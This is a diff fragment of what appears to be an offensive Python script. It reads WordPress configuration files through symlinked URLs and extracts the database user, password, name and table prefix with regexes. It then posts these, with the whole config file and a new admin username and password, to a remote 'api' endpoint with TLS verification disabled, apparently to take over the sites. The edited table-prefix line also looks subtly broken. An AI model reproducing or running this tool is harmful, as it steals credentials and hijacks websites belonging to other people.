@@ -65,10 +65,10 @@ for i in list:
                 print("\033[43;1m["+i+"]\033[0m"),
                 conf = requests.get(urlsym+i).text
                 try:
-                        dbuser = re.findall("DB_USER', '(.*?)'", conf)[0]
-                        dbpass = re.findall("DB_PASSWORD', '(.*?)'", conf)[0]
-                        dbname = re.findall("DB_NAME', '(.*?)'", conf)[0]
-                        dbprefix = re.findall("table_prefix = '(.*?)';", conf)[0]
+                        dbuser = re.findall("\nDB_USER', '(.*?)'", conf)[0]
+                        dbpass = re.findall("\nDB_PASSWORD', '(.*?)'", conf)[0]
+                        dbname = re.findall("\nDB_NAME', '(.*?)'", conf)[0]
+                        dbprefix = re.findall("\ntable_prefix(.*?)=(.*?)'(.*?)';", conf)[2]
                         data = {"user_baru":user,"pass_baru":pwd,"config":conf,"hajar":"hajar","dbuser":dbuser, "dbpass":dbpass, "dbname":dbname, "dbprefix":dbprefix}
                         text = requests.post(api, data=data, headers=head, verify=False, timeout=mati).text
                 except:
